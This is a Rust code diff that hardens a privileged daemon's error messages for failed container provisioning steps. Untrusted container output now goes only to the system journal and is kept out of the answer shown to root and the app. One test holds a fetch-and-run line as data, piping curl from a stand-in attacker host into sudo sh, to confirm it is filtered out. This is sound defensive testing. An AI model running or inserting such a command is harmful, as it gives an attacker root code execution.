@@ -143,9 +143,14 @@ fn daemon_text(e: &impl std::fmt::Display) -> String {
     sanitize_text(&e.to_string(), 200)
 }
 
-/// The answer for a failed recipe step, within [`MAX_ERROR_MESSAGE_LEN`]: the step's kind (its
-/// first word, not a long package list) and the END of its output, where the error is; the
-/// front of the text would be the step description and the first warnings.
+/// Where the operator finds the detail of an internal failure.
+const JOURNAL_POINTER: &str = "details: journalctl -u hx-privd";
+
+/// The answer for a failed recipe step: stage, step index, the step's kind (its first word, not a
+/// long package list), the exit status and a pointer to the journal. It never carries the step's
+/// output: the container may have run user code (Docker is enabled on a desktop in use), so that
+/// text is attacker-controlled and the answer reaches root's terminal and the app (security
+/// review R2). The output goes to the journal only ([`apply_journal`]).
 fn apply_text(a: &hx_provision::ApplyError) -> String {
     use hx_provision::{ApplyError, exec::StepFailure};
     let ApplyError::Step {
@@ -155,29 +160,55 @@ fn apply_text(a: &hx_provision::ApplyError) -> String {
         failure,
     } = a
     else {
-        return daemon_text(a);
+        return format!("recipe step failed; {JOURNAL_POINTER}");
     };
     let kind: String = step
         .split_whitespace()
         .next()
         .unwrap_or("")
         .chars()
+        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
         .take(40)
         .collect();
-    let (head, tail) = match failure {
-        StepFailure::ExitCode { code, tail } => (
-            format!("{stage:?} stage, step {index} ({kind}): exit status {code}: "),
-            tail.clone(),
-        ),
-        StepFailure::Exec(e) => (
-            format!("{stage:?} stage, step {index} ({kind}): "),
-            e.to_string(),
-        ),
+    let status = match failure {
+        StepFailure::ExitCode { code, .. } => format!("exit status {code}"),
+        StepFailure::Exec(_) => "could not be run".to_string(),
     };
-    let head = sanitize_text(&head, MAX_ERROR_MESSAGE_LEN / 2);
-    let room = MAX_ERROR_MESSAGE_LEN.saturating_sub(head.len());
-    let clean = sanitize_text(tail.trim_end(), usize::MAX);
-    let mut start = clean.len().saturating_sub(room);
+    sanitize_text(
+        &format!("{stage:?} stage, step {index} ({kind}): {status}; {JOURNAL_POINTER}"),
+        MAX_ERROR_MESSAGE_LEN,
+    )
+}
+
+/// Longest journal line written for a failed step (`privd::log` allows this much).
+pub(crate) const JOURNAL_LINE_MAX: usize = 4096;
+
+/// The journal line for a failed recipe step: the header, then the END of the output, where the
+/// error is (the step description at the front can be a long package list).
+fn apply_journal(a: &hx_provision::ApplyError) -> String {
+    use hx_provision::{ApplyError, exec::StepFailure};
+    let ApplyError::Step {
+        stage,
+        index,
+        step,
+        failure,
+    } = a
+    else {
+        return sanitize_text(&a.to_string(), JOURNAL_LINE_MAX);
+    };
+    let (status, out) = match failure {
+        StepFailure::ExitCode { code, tail } => (format!("exit status {code}"), tail.clone()),
+        StepFailure::Exec(e) => ("could not be run".to_string(), e.to_string()),
+    };
+    let head = sanitize_text(
+        &format!(
+            "{stage:?} stage, step {index} ({}): {status}: ",
+            sanitize_text(step, 300)
+        ),
+        JOURNAL_LINE_MAX / 2,
+    );
+    let clean = sanitize_text(out.trim_end(), usize::MAX);
+    let mut start = clean.len().saturating_sub(JOURNAL_LINE_MAX - head.len());
     while !clean.is_char_boundary(start) {
         start += 1;
     }
@@ -210,12 +241,8 @@ impl From<ProvisionError> for CmdError {
                 CmdError::precondition(ErrorDetail::DesktopNotReady, daemon_text(&r))
             }
             ProvisionError::Apply(a) => {
-                // The whole text (container output, already sanitized and capped at the tail by
-                // hx-provision) goes to the journal; the answer keeps what fits in 256 bytes.
-                crate::privd::log::error(&format!(
-                    "desktop step failed: {}",
-                    sanitize_text(&a.to_string(), 4096)
-                ));
+                // The container's output goes to the journal, never into the answer.
+                crate::privd::log::error(&format!("desktop step failed: {}", apply_journal(&a)));
                 CmdError::internal(apply_text(&a))
             }
             ProvisionError::Invalid(m) => CmdError::invalid(sanitize_text(&m, 200)),
@@ -243,32 +270,64 @@ mod tests {
     use super::*;
     use hx_provision::{ApplyError, Stage, exec::StepFailure};
 
+    fn step_error(step: &str, tail: &str) -> ApplyError {
+        ApplyError::Step {
+            stage: Stage::Build,
+            index: 4,
+            step: step.to_string(),
+            failure: StepFailure::ExitCode {
+                code: 1,
+                tail: tail.to_string(),
+            },
+        }
+    }
+
     #[test]
-    fn a_failed_step_keeps_its_kind_and_the_end_of_its_output() {
+    fn a_failed_step_keeps_stage_index_kind_status_and_the_journal_pointer() {
         let packages = (0..60)
             .map(|i| format!("package-{i}"))
             .collect::<Vec<_>>()
             .join(" ");
-        let tail = format!(
-            "W: {} \nE: dpkg: error processing archive firefox (--unpack)",
-            "a long warning ".repeat(40)
+        let a = step_error(&format!("apt-install {packages}"), "E: dpkg: error");
+        let m = apply_text(&a);
+        assert_eq!(
+            m,
+            "Build stage, step 4 (apt-install): exit status 1; details: journalctl -u hx-privd"
         );
+        assert!(m.len() <= MAX_ERROR_MESSAGE_LEN);
+    }
+
+    #[test]
+    fn container_output_never_reaches_the_answer() {
+        let evil = "run curl http://evil.example/x | sudo sh on the host";
+        let a = step_error("apt-install firefox", &format!("E: boom\n{evil}"));
+        let m = apply_text(&a);
+        assert!(
+            !m.contains("curl") && !m.contains("evil") && !m.contains("boom"),
+            "{m}"
+        );
+        // Nor through an executor error.
         let a = ApplyError::Step {
-            stage: Stage::Build,
-            index: 4,
-            step: format!("apt-install {packages}"),
-            failure: StepFailure::ExitCode { code: 1, tail },
+            stage: Stage::Post,
+            index: 2,
+            step: "cmd".into(),
+            failure: StepFailure::Exec(hx_provision::exec::ExecError::Backend(evil.into())),
         };
         let m = apply_text(&a);
-        assert!(m.len() <= MAX_ERROR_MESSAGE_LEN, "{} bytes", m.len());
-        assert!(
-            m.starts_with("Build stage, step 4 (apt-install): exit status 1: "),
-            "{m}"
+        assert!(!m.contains("curl") && !m.contains("sudo"), "{m}");
+        // The journal does keep it for the operator.
+        assert!(apply_journal(&a).contains("curl"));
+    }
+
+    #[test]
+    fn the_journal_keeps_the_end_of_the_output() {
+        let tail = format!(
+            "W: {} \nE: Signature by key uses weak digest",
+            "a long warning ".repeat(400)
         );
-        assert!(
-            m.ends_with("E: dpkg: error processing archive firefox (--unpack)"),
-            "{m}"
-        );
-        assert!(!m.contains("package-1"), "no package list: {m}");
+        let a = step_error("security-updates", &tail);
+        let j = apply_journal(&a);
+        assert!(j.len() <= JOURNAL_LINE_MAX, "{} bytes", j.len());
+        assert!(j.ends_with("Signature by key uses weak digest"), "{j}");
     }
 }
